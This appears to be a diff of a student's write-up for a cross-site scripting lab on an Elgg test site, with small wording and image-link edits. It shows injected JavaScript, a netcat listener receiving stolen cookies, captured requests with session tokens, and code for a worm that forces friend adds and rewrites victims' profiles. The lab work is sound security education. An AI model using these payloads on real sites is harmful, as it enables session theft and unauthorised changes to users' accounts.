@@ -12,10 +12,10 @@ This task carries out a XSS attack by adding some JavaScript code in one's profi
 
 After I saved the update, it is going to bring me to Alice's home page and I saw:
 ![success](Task1-2.PNG)
-This proves that our attack was success. On the other hand, I have tried many other spots to insert the JavaScript code. For example, if I just add the JavaScript code in About me, without going into the Edit HTML option, the attack was unsuccessful since that is being treated as a paragraph and characters like "<" and ">" has been converted. Spots such as the email require something in the form of an email; thus, it will not allow me to update it with a JavaScript code. Overall, I have carried out the attack in many different spots such as Brief description and About me (when I am under Edit HTML option).
+This proves that our attack was success. On the other hand, I have tried many other spots to insert the JavaScript code. For example, if I just add the JavaScript code in About me, without going into the text mode option, the attack was unsuccessful since that is being treated as a paragraph and characters like "<" and ">" has been converted. Spots such as the email require something in the form of an email; thus, it will not allow me to update it with a JavaScript code. Overall, I have carried out the attack in many different spots such as Brief description and About me (when I am under text mode).
 
 ### Task 2:
-In this task, I am trying to carry out show that I could get the cookie information and not just a random popup that does not have any sensitive information:
+In this task, I am trying to carry out the attack to show that I could get the cookie information and not just a random popup that does not have any sensitive information:
 
 ![attack](Task2-1.PNG)
 
@@ -24,7 +24,7 @@ Just like last time, I saved it and it will bring me to the profile page:
 Similar to last time, a popup appeared. However, it is displaying the cookie information instead of a message. Similar to last time, I tried the code in different fields and everything was the same as last time.
 
 ### Task 3:
-Although task 2 was cool, the cookie information is displayed to the victim, so the attacker could not actually see the information to do any damage. This time, we are trying to pass the cookie information to the attack's machine:
+Although task 2 was cool, but the cookie information is displayed to the victim, so the attacker could not actually see the information to do any damage. This time, we are trying to pass the cookie information to the attack's machine:
 ![attack](Task3-1.PNG)
 ```
 [03/10/21]seed@VM:~/.../lab05$ nc -lknv 5555
@@ -39,12 +39,12 @@ Accept-Encoding: gzip, deflate
 Connection: keep-alive
 Referer: http://www.xsslabelgg.com/profile/alice
 ```
-This time, the attacker, netcat, is waiting on port 5555 for the response. In our JavaScript code, we included a image tag that tells it to go the location, which is our local host this time, and in port 5555. However, the cookie information is passed to the location while Elgg request for the "image". Therefore, we have recieved the cookie infomation on the attack's end.
+This time, the attacker, netcat, is waiting on port 5555 for the response. In our JavaScript code, we included a image tag that tells it to go to the location, which is our local host this time, and through port 5555. The cookie information is passed to the location while Elgg request for the "image". Therefore, we have received the cookie information on the attack's end.
 
 
 ### Task 4:
 
-##### Task 4.1:
+#### Task 4.1:
 In this task, I am trying to carry out an attack that will add Samy as a friend when his profile is view by anyone. First, I did a regular add friend and used burp suite to find the information I need.
 ```
 GET /action/friends/add?friend=59&__elgg_ts=1615407806&__elgg_token=9l5ZkOx6YH-W4EjfXoGmaQ&__elgg_ts=1615407806&__elgg_token=9l5ZkOx6YH-W4EjfXoGmaQ HTTP/1.1
@@ -59,7 +59,7 @@ Cookie: Elgg=084bm4flu0uc2980g85k5q8s9f
 Connection: close
 ```
 
-In the code, we can see the elgg_token and elgg_ts being found for us. Thus, we need to use the other information to try to make the sendurl as closely as possible. Through the information above, we found the host (www.xsslabelgg.com), the location where the action of adding a friend is located (/action/friends/add), and Samy's guid (59). Then we are just added everything up to form our sendurl. Then I included the JavaScript code in about me in Edit HTML.
+In the code, we can see the elgg_token and elgg_ts being found for us. Thus, we need to use the other information to try to make the sendurl as closely as possible. Through the information above, we found the host (www.xsslabelgg.com), the location where the action of adding a friend is located (/action/friends/add), and Samy's guid (59). Then we are just added everything up to form our sendurl. Then I included the JavaScript code in about me in Text mode of About me.
 ```
 <script type="text/javascript">
 window.onload = function () {
@@ -84,9 +84,9 @@ Then I made sure Samy and Alice are not friends. (To save a little space, I have
 Next I searched for [Samy as Alice](Task4-1-3.png) and viewed [Samy's profile](Task4-1-4.PNG). When I go back to view Alice's friend list:
 
 ![success](Task4-1-5.PNG)
-We can see that Samy is a friend of Alice but Alice never had that request. When I logged in as Samy, I could see that Samy and Alice had made Samy a friend. Since we never said in the code that Samy should not add himself as a friend, it happened when we viewed Samy's profile as Samy.
+We can see that Samy is a friend of Alice but Alice never had that request. When I logged in as Samy, I could see that [Samy and Alice are friends](Task4-1-6.PNG). Since we never said in the code that Samy should not add himself as a friend, it happened when we viewed Samy's profile as Samy.
 
-##### Task 4.2:
+#### Task 4.2:
 This time, we are trying to see if Editor mode is going to launch the attack. Before I tried this, I deleted everyone as a friend and the original code. As we can see, [no one](Task4-2-1.PNG) is Samy's friend and [no one](Task4-2-2.PNG) has made friend with Samy. Then I included the same code in the editor mode:
 ```
 <script type="text/javascript">
@@ -114,7 +114,7 @@ Then when we viewed Samy's profile, the whole code appears. When we opened the i
 
 ### Task 5:
 
-##### Task 5.1:
+#### Task 5.1:
 In this task, we are trying to modify other people's profile page if they view ours. In order to accomplish this, I have to first understand how update profile is used. Therefore, I looked to burp suite for help:
 ```
 POST /action/profile/edit HTTP/1.1
@@ -175,11 +175,11 @@ Since the token and time stamp is needed for every connection, I included it in 
 
 After writing the code in Samy's profile, I logged in as Alice and made sure that her [profile](Task5-1-2.PNG) is blank. Then I [searched](Task5-1-3.PNG) for Samy. When I came back to Alice's profile, I have the following:
 
-![success](Task5-2-1.PNG)
+![success](Task5-1-4.PNG)
 
 I could see that Samy is my hero is located on Alice's profile even though all Alice did was view Samy's profile page. Thus, we can conclude that our attack was successful.
 
-##### Task 5.2:
+#### Task 5.2:
 We need line (1) to ensure that Samy is not attacking himself. In the last task, we can see that Samy has friended himself and that is not an normal action a user can complete. In this case, since the worm is not self-propagating yet, if Samy attacks himself, it would remove his worm that he wrote, so anyone who comes after the attack will not be affected. Furthermore, you would not want to attack yourself anyways. In conclusion, line (1) will check the user's guid to make sure it is not Samy, to guarantee that Samy is not attacking himself. Then I removed the line to try the attack. First, I double checked to make sure [Samy](Task5-2-1.PNG) is not displaying the message. Then I updated the code in his profile:
 ![attack](Task5-2-2.PNG)
 
